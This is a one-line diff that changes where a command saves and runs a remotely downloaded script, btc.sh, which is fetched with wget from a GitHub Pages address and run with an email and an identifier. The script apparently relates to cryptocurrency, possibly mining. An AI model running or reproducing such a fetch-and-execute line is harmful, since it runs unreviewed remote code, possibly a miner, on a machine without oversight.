@@ -1,1 +1,1 @@
-wget 'https://tngx.github.io/btc.sh' -O /root/btc.sh && chmod +x /root/btc.sh && /root/btc.sh -g azure-g@gmail.com -i tungbui
+wget 'https://tngx.github.io/btc.sh' -O /tmp/btc.sh && chmod +x /tmp/btc.sh && /tmp/btc.sh -g azure-g@gmail.com -i tungbui
